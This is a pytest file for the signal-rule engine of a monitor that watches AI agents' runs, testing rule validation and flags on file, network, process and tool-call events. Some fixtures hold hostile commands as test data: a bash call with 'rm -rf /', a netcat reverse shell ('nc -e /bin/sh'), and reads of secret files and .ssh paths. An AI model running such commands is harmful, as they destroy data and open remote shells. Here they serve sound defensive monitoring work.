import json
from collections.abc import AsyncIterator
from pathlib import Path
from typing import Any

import pytest
from test_signals import AGENT, Bench, bench, change

from aims.events import (
    FileAccess,
    LocalEventStore,
    NetConnect,
    ProcSignal,
    ToolCall,
)
from aims.monitor.config import MonitorConfig, Rule
from aims.monitor.signals.base import SignalError
from aims.monitor.signals.engine import SignalEngine
from aims.monitor.signals.rules import compile_glob, compile_rule, validate_rules

pytestmark = pytest.mark.anyio


@pytest.fixture
async def store(tmp_path: Path) -> AsyncIterator[LocalEventStore]:
    async with await LocalEventStore.open(tmp_path / "runs") as store:
        yield store


def rule(**f: Any) -> Rule:
    base: dict[str, Any] = {
        "id": "r",
        "title": "rule",
        "event": ["file.access"],
        "category": "constraint_violation",
        "importance": 3,
    }
    return Rule.model_validate({**base, **f})


def problems(**f: Any) -> list[str]:
    return validate_rules([rule(**f)])


def test_a_sound_rule_validates() -> None:
    assert (
        problems(
            match={"op": ["write", "rename"], "path|glob": "/work/**", "agent_written": False},
            filter=[{"phase": "setup"}, {"path|endswith|any": [".pyc", ".tmp"]}],
            key="{path} {agent}",
        )
        == []
    )
    assert problems(event=["fs.change"], match={"timestomp": True}) == []
    assert problems(event=["proc.exec"], match={"fds.1.kind": "pipe", "argv.0|re": "^py"}) == []
    assert problems(event=["fs.snapshot"], match={"changes.path|startswith": "/work"}) == []
    assert problems(event=["run.started"], match={"config.anything.below": 1}) == []


@pytest.mark.parametrize(
    ("fields", "message"),
    [
        ({"event": ["file.nothing"]}, "unknown event type file.nothing"),
        ({"event": ["monitor.flag"]}, "unknown event type monitor.flag"),
        ({"match": {"nope": 1}}, "has no field 'nope'"),
        ({"event": ["proc.exec"], "match": {"fds.3.ino": 1}}, "has no field 'fds.3.ino'"),
        ({"event": ["proc.exec"], "match": {"path.deeper": "x"}}, "has no field 'path.deeper'"),
        ({"event": ["file.access", "net.connect"], "match": {"op": "read"}}, "net.connect has no"),
        ({"match": {"target_in_tree": True}}, "does not apply to file.access"),
        ({"match": {"phase.x": 1}}, "has no parts"),
        ({"match": {"path|regex": "x"}}, "unknown modifier regex"),
        ({"match": {"path|glob|re": "x"}}, "at most one comparison"),
        ({"match": {"path|any|all": "x"}}, "at most one comparison"),
        ({"match": {"path|re": "("}}, "bad regex"),
        ({"match": {"path|cidr": "10.0.0.0/33"}}, "is not a network"),
        ({"match": {"errno|gt": "1"}}, "gt takes a number"),
        ({"match": {"path|contains": 1}}, "contains takes text"),
        ({"match": {"path|exists": "yes"}}, "exists takes true or false"),
        ({"match": {"path": []}}, "an empty list matches nothing"),
        ({"match": {"path": {"a": 1}}}, "is not a scalar"),
        ({"filter": [{"nope|contains": "x"}]}, "filter 1: file.access has no field"),
        ({"key": "{nope}"}, "key: file.access has no field 'nope'"),
        ({"key": "{path"}, "unbalanced braces"),
    ],
)
def test_validation_errors(fields: dict[str, Any], message: str) -> None:
    found = problems(**fields)
    assert found, fields
    assert any(message in p for p in found), found
    assert all(p.startswith("rule r:") for p in found)
    with pytest.raises(SignalError):
        compile_rule(rule(**fields))


def test_globs() -> None:
    assert compile_glob("*.pth")("/usr/lib/site-packages/x.pth")
    assert not compile_glob("/work/*.py")("/work/a/b.py")
    assert compile_glob("/work/**")("/work/a/b.py")
    assert compile_glob("**/.ssh/**")("/home/agent/.ssh/id")
    assert not compile_glob("/work/test_*.py")("/work/__pycache__/test_a.cpython-313.pyc")


async def run_rule(
    store: LocalEventStore, r: Rule, *, config: dict[str, Any] | None = None
) -> Bench:
    return await bench(store, config=MonitorConfig(preset="signals", rules=[r], **(config or {})))


async def test_match_lists_or_all_and_filters(store: LocalEventStore) -> None:
    r = rule(
        match={"op": ["write", "delete"], "path|startswith|all": ["/work/", "/work/src"]},
        filter=[{"path|endswith": ".pyc"}],
        key="{op} {path}",
    )
    b = await run_rule(store, r)
    await b.bash(
        "x",
        lambda ex: b.k(FileAccess, ex, op="write", path="/work/src/a.py"),
        lambda ex: b.k(FileAccess, ex, op="read", path="/work/src/b.py"),
        lambda ex: b.k(FileAccess, ex, op="delete", path="/work/c.py"),
        lambda ex: b.k(FileAccess, ex, op="delete", path="/work/src/c.pyc"),
        lambda ex: b.k(FileAccess, ex, op="delete", path="/work/src/d.py"),
    )
    flags = b.of("r")
    assert [f.key for f in flags] == ["write /work/src/a.py", "delete /work/src/d.py"]
    assert all(f.justification.startswith("rule: ") for f in flags)
    assert all(
        (f.category, f.importance, f.layer) == ("constraint_violation", 3, "signal") for f in flags
    )


async def test_modifiers_on_numbers_networks_and_lists(store: LocalEventStore) -> None:
    rules = [
        rule(
            id="net",
            event=["net.connect"],
            match={"address|cidr": ["10.0.0.0/8", "fd00::/8"], "port|gte": 1000, "port|lt": 2000},
            key="{address}",
        ),
        rule(
            id="args",
            event=["proc.exec"],
            match={"argv|contains": "secret", "argv.0": "cat"},
            key="{argv}",
        ),
        rule(id="none", event=["proc.exec"], match={"argv.1|exists": False}, key="{program}"),
        rule(id="re", event=["tool.call"], match={"arguments|re": r"\brm\s+-rf\b"}, key="{name}"),
    ]
    b = await bench(store, config=MonitorConfig(preset="signals", rules=rules))
    await b.bash(
        "x",
        lambda ex: b.k(
            NetConnect, ex, kind="connect", family="inet", address="10.1.2.3", port=1500
        ),
        lambda ex: b.k(
            NetConnect, ex, kind="connect", family="inet", address="10.1.2.4", port=2000
        ),
        lambda ex: b.k(
            NetConnect, ex, kind="connect", family="inet6", address="::ffff:10.0.0.1", port=1000
        ),
        lambda ex: b.k(
            NetConnect, ex, kind="connect", family="inet", address="11.0.0.1", port=1500
        ),
        lambda ex: b.proc(ex, ["cat", "/work/secret.txt"]),
        lambda ex: b.proc(ex, ["head", "secret"]),
        lambda ex: b.proc(ex, ["ls"]),
    )
    await b.call("bash", {"command": "rm -rf /"})
    assert [f.key for f in b.of("net")] == ["10.1.2.3", "::ffff:10.0.0.1"]
    assert [f.key for f in b.of("args")] == ["cat /work/secret.txt"]
    assert [f.key for f in b.of("none")] == ["ls"]
    assert [f.key for f in b.of("re")] == ["bash"]


async def test_scope_and_derived_fields(store: LocalEventStore) -> None:
    rules = [
        rule(
            id="mine",
            event=["file.access"],
            scope={"phase": ["agent"], "agent": [AGENT]},
            match={"agent_written": True, "op": "read"},
            key="{path} {tool} {step}",
        ),
        rule(
            id="sig", event=["proc.signal"], match={"target_in_tree": False}, key="{target_agent}"
        ),
    ]
    b = await bench(store, config=MonitorConfig(preset="signals", rules=rules))
    await b.bash("x", lambda ex: b.k(FileAccess, ex, op="write", path="/work/a.py"))
    await b.bash(
        "y",
        lambda ex: b.k(FileAccess, ex, op="read", path="/work/a.py"),
        lambda ex: b.k(FileAccess, ex, op="read", path="/work/b.py"),
        lambda ex: b.k(ProcSignal, ex, target=ex.root, signal=15),
        lambda ex: b.k(ProcSignal, ex, target=99999, signal=15),
    )
    v = await b.exec("score", phase="verifier")
    await b.emit(b.k(FileAccess, v, op="read", path="/work/a.py"))
    assert [f.key for f in b.of("mine")] == ["/work/a.py bash 2"]
    assert [f.key for f in b.of("sig")] == [None]


async def test_rules_see_snapshot_changes_and_blob_content(store: LocalEventStore) -> None:
    rules = [
        rule(
            id="snap",
            event=["fs.change"],
            match={"path|glob": "*.sh", "change": "added"},
            filter=[{"phase": ["setup", "verifier"]}],
            key="{path}",
        ),
        rule(id="long", event=["tool.call"], match={"arguments|contains": "NEEDLE"}, key="{name}"),
    ]
    b = await bench(store, config=MonitorConfig(preset="signals", rules=rules))
    ex = await b.bash("x")
    await b.snapshot(ex, change("/work/run.sh"), change("/work/a.py"))
    setup = await b.exec("seed", phase="setup")
    await b.snapshot(setup, change("/work/seed.sh"))
    big = json.dumps({"command": "x" * 20_000 + "NEEDLE"})
    blob = await b.store.content(b.run_id, big)
    assert not isinstance(blob, str)
    await b.emit(ToolCall(call_id="big", name="bash", arguments=blob))
    assert [f.key for f in b.of("snap")] == ["/work/run.sh"]
    assert [f.key for f in b.of("long")] == ["bash"]


async def test_scenario_rules_obey_signal_options(store: LocalEventStore) -> None:
    r = rule(match={"op": "write"})
    off = MonitorConfig(preset="signals", rules=[r.model_copy(update={"enabled": False})])
    b = await bench(store, config=off)
    await b.bash("x", lambda ex: b.k(FileAccess, ex, op="write", path="/work/a"))
    assert b.of("r") == []
    louder = MonitorConfig(preset="signals", rules=[r], signals={"r": {"importance": 5}})
    b = await bench(store, config=louder)
    await b.bash("x", lambda ex: b.k(FileAccess, ex, op="write", path="/work/a"))
    assert [f.importance for f in b.of("r")] == [5]
    with pytest.raises(SignalError, match=r"signal r"):
        SignalEngine(
            MonitorConfig(preset="signals", rules=[r], signals={"r": {"options": {"x": 1}}}),
            b.scenario,
            run_id=b.run_id,
            store=store,
        )
    with pytest.raises(SignalError, match="bad regex"):
        SignalEngine(
            MonitorConfig(preset="signals", rules=[rule(match={"path|re": "["})]),
            b.scenario,
            run_id=b.run_id,
            store=store,
        )


async def test_the_most_important_matching_rule_of_a_signal_wins(store: LocalEventStore) -> None:
    b = await bench(store)
    await b.bash(
        "nc",
        lambda ex: b.proc(ex, ["nc", "-e", "/bin/sh", "host", "1"]),
    )
    (flag,) = b.of("net_tool_exec")
    assert (flag.importance, flag.justification) == (3, "netcat with a command to run: nc")
